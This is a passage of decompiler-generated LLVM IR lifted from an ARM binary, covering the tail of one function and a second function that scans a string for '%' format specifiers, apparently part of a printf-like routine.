  store i32 32, i32* @sb, align 4
  store i32 %v2_db54, i32* @r6, align 4
  store i32 %v2_daf4, i32* %stack_var_-180, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_db48:                                ; preds = %dec_label_pc_dae4
  br i1 %v7_db48, label %dec_label_pc_db50, label %dec_label_pc_dcd8

dec_label_pc_db50:                                ; preds = %dec_label_pc_db48
  %v0_db50 = call i32 @function_cc08()
  store i32 %v0_db50, i32* %r0.global-to-local, align 4
  %v1_db58 = inttoptr i32 %v0_db50 to i32*
  %v2_db58 = load i32, i32* %v1_db58, align 4
  store i32 %v2_db58, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_db60 = call i32 @function_eff8(i32 %v2_db58, i32 %v2_db54, i32 128)
  store i32 %v3_db60, i32* %r0.global-to-local, align 4
  store i32 %v3_db60, i32* @r6, align 4
  br label %dec_label_pc_db00

dec_label_pc_db6c:                                ; preds = %dec_label_pc_d9f8, %.thread26, %bb160
  %v0_db8c.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_d98c, %dec_label_pc_d9f8 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_db74:                                ; preds = %dec_label_pc_daf4, %dec_label_pc_da5c
  store i32 ptrtoint ([7 x i8]* @global_var_15d3c.338 to i32), i32* @r6, align 4
  br label %dec_label_pc_db7c

dec_label_pc_db7c:                                ; preds = %bb164, %dec_label_pc_db74
  %storemerge = phi i32 [ 6, %dec_label_pc_db74 ], [ %v2_db14, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_db88

dec_label_pc_db88thread-pre-split:                ; preds = %.thread90, %dec_label_pc_dacc, %dec_label_pc_db20, %dec_label_pc_db6c
  %v1_db8c.pre = phi i32 [ 0, %dec_label_pc_db6c ], [ %v1_db8c.pre.pre, %dec_label_pc_dacc ], [ 0, %dec_label_pc_db20 ], [ %v2_d9f8, %.thread90 ]
  %v0_db8c.pre = phi i32 [ %v0_db8c.pre81, %dec_label_pc_db6c ], [ %v0_db8c.pre.pre, %dec_label_pc_dacc ], [ 1, %dec_label_pc_db20 ], [ %v1_d98c, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_d980, %dec_label_pc_db6c ], [ %v0_d8ac, %dec_label_pc_dacc ], [ %v0_d8ac, %dec_label_pc_db20 ], [ %v0_d980, %.thread90 ]
  %v0_db88.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_db88

dec_label_pc_db88:                                ; preds = %dec_label_pc_db88thread-pre-split, %dec_label_pc_da98, %dec_label_pc_db7c
  %v1_dbc8 = phi i32 [ %v1_db8c.pre, %dec_label_pc_db88thread-pre-split ], [ %v0_da98, %dec_label_pc_da98 ], [ 0, %dec_label_pc_db7c ]
  %v0_db8c = phi i32 [ %v0_db8c.pre, %dec_label_pc_db88thread-pre-split ], [ %v0_da88, %dec_label_pc_da98 ], [ %storemerge, %dec_label_pc_db7c ]
  %v0_db94 = phi i32 [ %v0_db88.pr, %dec_label_pc_db88thread-pre-split ], [ 11, %dec_label_pc_da98 ], [ 11, %dec_label_pc_db7c ]
  %v0_dbd0 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_db88thread-pre-split ], [ %v0_d8ac, %dec_label_pc_da98 ], [ %v0_d8ac, %dec_label_pc_db7c ]
  %v7_db88 = icmp eq i32 %v0_db94, 11
  %v2_db8c = add i32 %v0_db8c, %v1_dbc8
  br i1 %v7_db88, label %dec_label_pc_dba4, label %bb165

bb165:                                            ; preds = %dec_label_pc_db88
  %v7_db9c = icmp sgt i32 %v0_db94, 5
  %. = select i1 %v7_db9c, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_dba0 = add i32 %., %v2_db8c
  br label %dec_label_pc_dba4

dec_label_pc_dba4:                                ; preds = %dec_label_pc_db88, %bb165
  %v0_dbb8 = phi i32 [ %v2_db8c, %dec_label_pc_db88 ], [ %v2_dba0, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_dba8 = sub i32 %tmp97, %v0_dbb8
  %v3_dba8 = icmp uge i32 %tmp97, %v0_dbb8
  %v9_dba8 = icmp eq i32 %tmp97, %v0_dbb8
  %v2_dbac = xor i1 %v3_dba8, true
  %v3_dbac = or i1 %v9_dba8, %v2_dbac
  br i1 %v3_dbac, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_dba4
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_dba4, %bb166
  %v2_dbb0 = xor i1 %v9_dba8, true
  %v3_dbb0 = and i1 %v3_dba8, %v2_dbb0
  br i1 %v3_dbb0, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_dbb8.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_dba8, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_dbc8 = phi i32 [ %v1_dbb8.pre, %._crit_edge ], [ %v2_dba8, %bb168 ]
  %v2_dbb8 = add i32 %v0_dbb8, %stack_var_-336.2
  %v2_dbbc = add i32 %v2_dbb8, %v2_dbc8
  store i32 %v2_dbbc, i32* @ip, align 4
  store i32 %v0_dbd0, i32* %r3.global-to-local, align 4
  %v0_dbc4 = load i32, i32* @sb, align 4
  %v7_dbc4 = icmp eq i32 %v0_dbc4, 48
  br i1 %v7_dbc4, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_dbc8 = add i32 %v2_dbc8, %v1_dbc8
  store i32 %v3_dbc8, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_dbe4 = phi i32 [ %v2_dbc8, %bb169 ], [ 0, %bb170 ]
  %v1_dbd0 = and i32 %v0_dbd0, 8
  store i32 %v1_dbd0, i32* @r8, align 4
  %v2_dbd0 = icmp eq i32 %v1_dbd0, 0
  br i1 %v2_dbd0, label %dec_label_pc_dbdc, label %dec_label_pc_dbf8

dec_label_pc_dbdc:                                ; preds = %.thread29
  %v0_dbdc = load i32, i32* @fp, align 4
  store i32 %v0_dbdc, i32* %r0.global-to-local, align 4
  store i32 %v0_dbe4, i32* %r2.global-to-local, align 4
  %v4_dbe8 = call i32 @function_d63c(i32 %v0_dbdc, i8 32, i32 %v0_dbe4)
  store i32 %v4_dbe8, i32* %r0.global-to-local, align 4
  %v1_dbec = load i32, i32* @sl, align 4
  %v9_dbec = icmp eq i32 %v4_dbe8, %v1_dbec
  br i1 %v9_dbec, label %dec_label_pc_dbf4, label %dec_label_pc_dcd8

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbdc
  %v0_dbf4 = load i32, i32* @r8, align 4
  store i32 %v0_dbf4, i32* @sl, align 4
  %v0_dc00.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %.thread29, %dec_label_pc_dbf4
  %v0_dc00 = phi i32 [ %v0_db94, %.thread29 ], [ %v0_dc00.pre, %dec_label_pc_dbf4 ]
  %v0_dbfc = load i32, i32* @fp, align 4
  %v2_dc00 = add i32 %v0_dc00, ptrtoint (i32* @global_var_15d44.340 to i32)
  store i32 %v2_dc00, i32* %r0.global-to-local, align 4
  %v2_dc04 = call i32 @function_eb20(i32 %v2_dc00, i32 %v0_dbfc)
  %v0_dc08 = load i32, i32* @fp, align 4
  store i32 %v0_dc08, i32* %r0.global-to-local, align 4
  %v0_dc10 = load i32, i32* @r4, align 4
  store i32 %v0_dc10, i32* %r2.global-to-local, align 4
  %v4_dc14 = call i32 @function_d63c(i32 %v0_dc08, i8 48, i32 %v0_dc10)
  store i32 %v4_dc14, i32* %r0.global-to-local, align 4
  %v1_dc18 = load i32, i32* @r4, align 4
  %v9_dc18 = icmp eq i32 %v4_dc14, %v1_dc18
  br i1 %v9_dc18, label %dec_label_pc_dc20, label %dec_label_pc_dcd8

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dbf8
  %v3_dc20 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dc20, i32* %r3.global-to-local, align 4
  %v2_dc24 = icmp eq i32 %v3_dc20, 0
  br i1 %v2_dc24, label %dec_label_pc_dc34, label %dec_label_pc_dc94thread-pre-split

dec_label_pc_dc34:                                ; preds = %dec_label_pc_dc20
  %v0_dc34 = load i32, i32* @r5, align 4
  %v2_dc34 = icmp eq i32 %v0_dc34, 0
  br i1 %v2_dc34, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_dc34
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_dc34
  %v1_dc3c = load i32, i32* @r6, align 4
  store i32 %v1_dc3c, i32* %r0.global-to-local, align 4
  %v1_dc44 = load i32, i32* @fp, align 4
  store i32 %v1_dc44, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 56396, i32* @lr, align 4
  %v1_dc48 = xor i1 %v2_dc34, true
  call void @__pseudo_cond_branch(i1 %v1_dc48, i32 ptrtoint (i32* @global_var_11230.331 to i32))
  %v0_dc4c = load i32, i32* %r0.global-to-local, align 4
  %v1_dc4c = load i32, i32* @r5, align 4
  %v9_dc4c = icmp eq i32 %v0_dc4c, %v1_dc4c
  br i1 %v9_dc4c, label %dec_label_pc_dcac, label %dec_label_pc_dcd8

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc94
  %v2_dc58 = icmp ult i32 %v1_dc5c, 128
  %.v1_dc5c = select i1 %v2_dc58, i32 %v1_dc5c, i32 128
  store i32 %.v1_dc5c, i32* @r2, align 4
  %v0_dc64 = call i32 @function_11060()
  store i32 %v0_dc64, i32* @r4, align 4
  %v2_dc68 = icmp eq i32 %v0_dc64, 0
  store i32 %v0_dc64, i32* %r3.global-to-local, align 4
  store i32 %v2_db54, i32* %r0.global-to-local, align 4
  %v0_dc78 = load i32, i32* @fp, align 4
  store i32 %v0_dc78, i32* %r2.global-to-local, align 4
  br i1 %v2_dc68, label %dec_label_pc_dc88, label %dec_label_pc_dc80

dec_label_pc_dc80:                                ; preds = %dec_label_pc_dc58
  %v3_dc80 = call i32 @function_11230(i32 %v2_db54, i32 %v0_dc64, i32 %v0_dc78)
  store i32 %v3_dc80, i32* %r0.global-to-local, align 4
  store i32 %v3_dc80, i32* %r3.global-to-local, align 4
  %v1_dc88.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %dec_label_pc_dc58, %dec_label_pc_dc80
  %v1_dc88 = phi i32 [ 0, %dec_label_pc_dc58 ], [ %v1_dc88.pre, %dec_label_pc_dc80 ]
  %v0_dc8c = phi i32 [ 0, %dec_label_pc_dc58 ], [ %v3_dc80, %dec_label_pc_dc80 ]
  %v9_dc88 = icmp eq i32 %v0_dc8c, %v1_dc88
  %v1_dc8c = load i32, i32* @r5, align 4
  %v2_dc8c = sub i32 %v1_dc8c, %v0_dc8c
  store i32 %v2_dc8c, i32* @r5, align 4
  br i1 %v9_dc88, label %dec_label_pc_dc94, label %dec_label_pc_dcd8

dec_label_pc_dc94thread-pre-split:                ; preds = %dec_label_pc_dc20
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_dc98.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_dc94

dec_label_pc_dc94:                                ; preds = %dec_label_pc_dc94thread-pre-split, %dec_label_pc_dc88
  %v1_dc5c = phi i32 [ %v0_dc98.pr, %dec_label_pc_dc94thread-pre-split ], [ %v2_dc8c, %dec_label_pc_dc88 ]
  store i32 %v2_db54, i32* @r6, align 4
  %v2_dc98 = icmp eq i32 %v1_dc5c, 0
  store i32 %v2_da70, i32* @r1, align 4
  store i32 %v2_da84, i32* %r3.global-to-local, align 4
  store i32 %v2_db54, i32* @r0, align 4
  br i1 %v2_dc98, label %dec_label_pc_dcac, label %dec_label_pc_dc58

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dc94, %.thread36
  %v0_dcac = load i32, i32* @fp, align 4
  store i32 %v0_dcac, i32* %r0.global-to-local, align 4
  %v0_dcb4 = load i32, i32* @sl, align 4
  store i32 %v0_dcb4, i32* %r2.global-to-local, align 4
  %v4_dcb8 = call i32 @function_d63c(i32 %v0_dcac, i8 32, i32 %v0_dcb4)
  store i32 %v4_dcb8, i32* %r0.global-to-local, align 4
  %v1_dcbc = load i32, i32* @sl, align 4
  %v9_dcbc = icmp eq i32 %v4_dcb8, %v1_dcbc
  br i1 %v9_dcbc, label %dec_label_pc_dcc4, label %dec_label_pc_dcd8

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_d858, %dec_label_pc_da34
  %stack_var_-316.3 = phi i32 [ %v0_d8ac, %dec_label_pc_d858 ], [ %v0_dbd0, %dec_label_pc_dcac ], [ %v0_d8ac, %dec_label_pc_da34 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_d858 ], [ %v2_dbbc, %dec_label_pc_dcac ], [ %v2_da38, %dec_label_pc_da34 ]
  %v3_dcc4 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_dcc4, i32* @r4, align 4
  br label %dec_label_pc_dcc8

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_d768, %dec_label_pc_dcc4
  %v0_dcc8 = phi i32 [ %v0_dcc8.pre, %dec_label_pc_d768 ], [ %v3_dcc4, %dec_label_pc_dcc4 ]
  %v0_d8ac = phi i32 [ %tmp100, %dec_label_pc_d768 ], [ %stack_var_-316.3, %dec_label_pc_dcc4 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_d768 ], [ %stack_var_-336.3, %dec_label_pc_dcc4 ]
  store i32 %v0_dcc8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d780.outer

dec_label_pc_d780.outer:                          ; preds = %dec_label_pc_dcd0, %dec_label_pc_dcc8
  %v5_d7ac = phi i32 [ %v1_d7dc, %dec_label_pc_dcd0 ], [ %v0_dcc8, %dec_label_pc_dcc8 ]
  %v0_d78049 = phi i32 [ %v1_dcd0, %dec_label_pc_dcd0 ], [ %v0_dcc8, %dec_label_pc_dcc8 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_dcd0 ], [ %stack_var_-336.4, %dec_label_pc_dcc8 ]
  %v1_d780180 = inttoptr i32 %v0_d78049 to i8*
  %v2_d780181 = load i8, i8* %v1_d780180, align 1
  %v3_d780182 = zext i8 %v2_d780181 to i32
  store i32 %v3_d780182, i32* %r3.global-to-local, align 4
  %v2_d784183 = icmp eq i8 %v2_d780181, 0
  br i1 %v2_d784183, label %dec_label_pc_d79c, label %bb126

dec_label_pc_dcd0:                                ; preds = %dec_label_pc_d7dc
  %v1_dcd0 = add i32 %v0_d7e4, 2
  store i32 %v1_dcd0, i32* @r4, align 4
  br label %dec_label_pc_d780.outer

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_db48, %dec_label_pc_dcac, %.thread36, %dec_label_pc_dbf8, %dec_label_pc_dbdc, %dec_label_pc_daac, %bb162, %dec_label_pc_da10, %bb130, %dec_label_pc_dc88
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_dce0

dec_label_pc_dce0:                                ; preds = %dec_label_pc_d7d0, %bb, %dec_label_pc_d750, %dec_label_pc_dcd8
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_d750 ], [ -1, %dec_label_pc_dcd8 ], [ %stack_var_-336.2, %dec_label_pc_d7d0 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_d70c, i32* @r5, align 4
  store i32 %v15_d70c, i32* %r8.global-to-local, align 4
  store i32 %v18_d70c, i32* @sb, align 4
  store i32 %v21_d70c, i32* @sl, align 4
  store i32 %v24_d70c, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_dcd0, { 1, 0 }
  uselistorder i8 %v2_d780181, { 1, 2, 0 }
  uselistorder i32 %v0_d78049, { 2, 0, 1 }
  uselistorder i32 %v5_d7ac, { 2, 3, 1, 0 }
  uselistorder i32 %v0_d8ac, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_dcc8, { 1, 0, 2 }
  uselistorder i32 %v1_dc5c, { 2, 1, 0 }
  uselistorder i32 %v0_dc64, { 1, 0, 2, 3 }
  uselistorder i32 %v0_dbe4, { 1, 0 }
  uselistorder i32 %v2_dbc8, { 2, 0, 1 }
  uselistorder i1 %v3_dba8, { 1, 0 }
  uselistorder i32 %v0_dbb8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_db8c, { 1, 0 }
  uselistorder i32 %v0_dbd0, { 1, 0, 2 }
  uselistorder i32 %v3_db60, { 1, 2, 0 }
  uselistorder i32 %v0_db10, { 1, 0 }
  uselistorder i32 %v2_daf4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_dabc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_da88, { 1, 2, 0, 3 }
  uselistorder i32 %v1_d98c, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_d9a8, { 1, 2, 3, 0 }
  uselistorder i32 %v6_d928, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_d88c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_d83c.pre, { 2, 1, 0 }
  uselistorder i32 %v1_d834, { 1, 0 }
  uselistorder i32 %v1_d7dc, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_d79c, { 1, 0 }
  uselistorder i32 %v1_d794.lcssa, { 1, 0 }
  uselistorder i8 %v2_d780, { 1, 2, 0 }
  uselistorder i32 %v2_d794, { 1, 2, 3, 0 }
  uselistorder i1 %v7_d9a0, { 1, 0 }
  uselistorder i1 %v7_d8ec, { 1, 2, 0 }
  uselistorder i1 %v7_dae4, { 1, 0 }
  uselistorder i1 %v7_da44, { 1, 0 }
  uselistorder i1 %v7_d930, { 1, 0 }
  uselistorder i32 %v2_da84, { 0, 2, 1, 3 }
  uselistorder i32 %v2_db54, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_d864, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_d838, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_d818, { 1, 2, 0 }
  uselistorder i32 %v4_d810, { 1, 0 }
  uselistorder i32 %v2_d714, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 32, 3, 4, 1, 2, 5, 34, 0, 35, 36, 37, 38, 39, 6, 7, 8, 9, 10, 11, 12, 13, 33, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r2.global-to-local, { 17, 2, 3, 4, 5, 22, 23, 24, 25, 26, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 15, 16, 18, 19, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 10, 12, 11, 14, 13, 16, 15, 17, 18, 20, 19, 33, 39, 32, 29, 28, 40, 41, 43, 42, 27, 44, 5, 21, 2, 22, 1, 23, 24, 25, 3, 7, 26, 30, 31, 8, 9, 6, 34, 36, 35, 37, 4, 38, 0 }
  uselistorder i32 (i32, i8, i32)* @function_d63c, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_11060, { 1, 0 }
  uselistorder label %dec_label_pc_dce0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_dcd8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_dcc8, { 1, 0 }
  uselistorder label %dec_label_pc_dcc4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_dc88, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_dbf8, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_dba4, { 1, 0 }
  uselistorder label %dec_label_pc_db88, { 0, 2, 1 }
  uselistorder label %dec_label_pc_db88thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_db7c, { 1, 0 }
  uselistorder label %dec_label_pc_db6c, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_db00, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_d8dc, { 1, 0 }
  uselistorder label %dec_label_pc_d8d8, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d830, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_d7d0, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_d79c, { 2, 1, 0 }
}

define i32 @function_dd00(i32* %arg1) local_unnamed_addr {
dec_label_pc_dd00:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_dd00 = load i32, i32* @r4, align 4
  store i32 %v3_dd00, i32* %stack_var_-12, align 4
  %v6_dd00 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_dd0c = load i32, i32* @r1, align 4
  store i32 %v0_dd0c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_dd14 = bitcast i32* %arg1 to i8*
  %v3_dd14 = call i32 @function_ec20(i8* %v2_dd14, i32 0)
  %v0_dd18 = load i32, i32* @r4, align 4
  %v1_dd18 = add i32 %v0_dd18, 24
  %v2_dd18 = inttoptr i32 %v1_dd18 to i32*
  %v3_dd18 = load i32, i32* %v2_dd18, align 4
  %v1_dd1c = add i32 %v3_dd18, -1
  store i32 %v1_dd1c, i32* %v2_dd18, align 4
  %v0_dd24 = load i32, i32* @r5, align 4
  %v1_dd24 = load i32, i32* @r4, align 4
  %v2_dd24 = inttoptr i32 %v1_dd24 to i32*
  store i32 %v0_dd24, i32* %v2_dd24, align 4
  %v0_dd28 = load i32, i32* @r4, align 4
  %v1_dd28 = add i32 %v0_dd28, 40
  store i32 %v1_dd28, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_dd3819 = inttoptr i32 %v1_dd28 to i32*
  store i32 8, i32* %v2_dd3819, align 4
  %v3_dd3820 = load i32, i32* %r1.global-to-local, align 4
  %v4_dd3821 = add i32 %v3_dd3820, 4
  store i32 %v4_dd3821, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge

dec_label_pc_dd30.dec_label_pc_dd30_crit_edge:    ; preds = %dec_label_pc_dd00, %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge
  %v4_dd3822 = phi i32 [ %v4_dd3821, %dec_label_pc_dd00 ], [ %v4_dd38, %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge ]
  %v0_dd34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_dd34 = add i32 %v0_dd34.pre, -1
  store i32 %v1_dd34, i32* %r2.global-to-local, align 4
  %v7_dd34 = icmp eq i32 %v0_dd34.pre, 1
  %v2_dd38 = inttoptr i32 %v4_dd3822 to i32*
  store i32 8, i32* %v2_dd38, align 4
  %v3_dd38 = load i32, i32* %r1.global-to-local, align 4
  %v4_dd38 = add i32 %v3_dd38, 4
  store i32 %v4_dd38, i32* %r1.global-to-local, align 4
  br i1 %v7_dd34, label %dec_label_pc_dd40, label %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge

dec_label_pc_dd40:                                ; preds = %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge
  %v0_dd40 = load i32, i32* @r5, align 4
  store i32 %v0_dd40, i32* %r2.global-to-local, align 4
  %v1_dd843 = inttoptr i32 %v0_dd40 to i8*
  %v2_dd844 = load i8, i8* %v1_dd843, align 1
  %v2_dd886 = icmp eq i8 %v2_dd844, 0
  br i1 %v2_dd886, label %dec_label_pc_dd90, label %dec_label_pc_dd50

dec_label_pc_dd48:                                ; preds = %dec_label_pc_dd68
  %v2_dd4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_dd4c, i32* @r4, align 4
  store i32 %v6_dd00, i32* @r5, align 4
  ret i32 -1

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dd40, %dec_label_pc_dd84.backedge
  %v0_dd58 = phi i32 [ %storemerge, %dec_label_pc_dd84.backedge ], [ %v0_dd40, %dec_label_pc_dd40 ]
  %v2_dd847 = phi i8 [ %v2_dd84, %dec_label_pc_dd84.backedge ], [ %v2_dd844, %dec_label_pc_dd40 ]
  %v7_dd50 = icmp eq i8 %v2_dd847, 37
  br i1 %v7_dd50, label %dec_label_pc_dd58, label %dec_label_pc_dd80

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd50
  %v1_dd58 = add i32 %v0_dd58, 1
  %v2_dd58 = inttoptr i32 %v1_dd58 to i8*
  %v3_dd58 = load i8, i8* %v2_dd58, align 1
  store i32 %v1_dd58, i32* %r2.global-to-local, align 4
  %v7_dd5c = icmp eq i8 %v3_dd58, 37
  br i1 %v7_dd5c, label %dec_label_pc_dd80, label %dec_label_pc_dd68

dec_label_pc_dd68:                                ; preds = %dec_label_pc_dd58
  %v0_dd60 = load i32, i32* @r4, align 4
  %v2_dd68 = inttoptr i32 %v0_dd60 to i32*
  store i32 %v1_dd58, i32* %v2_dd68, align 4
  %v2_dd6c = call i32 @function_dfb8(i32* %v2_dd68)
  %v1_dd70 = icmp slt i32 %v2_dd6c, 0
  br i1 %v1_dd70, label %dec_label_pc_dd48, label %dec_label_pc_dd78

dec_label_pc_dd78:                                ; preds = %dec_label_pc_dd68
  %v0_dd78 = load i32, i32* @r4, align 4
  %v1_dd78 = inttoptr i32 %v0_dd78 to i32*
  %v2_dd78 = load i32, i32* %v1_dd78, align 4
  br label %dec_label_pc_dd84.backedge

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dd50, %dec_label_pc_dd58
  %v0_dd80 = phi i32 [ %v0_dd58, %dec_label_pc_dd50 ], [ %v1_dd58, %dec_label_pc_dd58 ]
  %v1_dd80 = add i32 %v0_dd80, 1
  br label %dec_label_pc_dd84.backedge

dec_label_pc_dd84.backedge:                       ; preds = %dec_label_pc_dd80, %dec_label_pc_dd78
  %storemerge = phi i32 [ %v1_dd80, %dec_label_pc_dd80 ], [ %v2_dd78, %dec_label_pc_dd78 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_dd84 = inttoptr i32 %storemerge to i8*
  %v2_dd84 = load i8, i8* %v1_dd84, align 1
  %v2_dd88 = icmp eq i8 %v2_dd84, 0
  br i1 %v2_dd88, label %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge, label %dec_label_pc_dd50

dec_label_pc_dd84.dec_label_pc_dd90_crit_edge:    ; preds = %dec_label_pc_dd84.backedge
  %v0_dd90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dd90

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge, %dec_label_pc_dd40
  %v0_dd90 = phi i32 [ %v0_dd90.pre, %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge ], [ %v0_dd40, %dec_label_pc_dd40 ]
  %v3_dd84.lcssa.in = phi i8 [ %v2_dd84, %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge ], [ %v2_dd844, %dec_label_pc_dd40 ]
  %v3_dd84.lcssa = zext i8 %v3_dd84.lcssa.in to i32
  %v1_dd90 = load i32, i32* @r4, align 4
  %v2_dd90 = inttoptr i32 %v1_dd90 to i32*
  store i32 %v0_dd90, i32* %v2_dd90, align 4
  %v2_dd94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_dd94, i32* @r4, align 4
  store i32 %v6_dd00, i32* @r5, align 4
  ret i32 %v3_dd84.lcssa

; uselistorder directives
  uselistorder i8 %v2_dd84, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_dd40, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dd38, { 1, 0 }
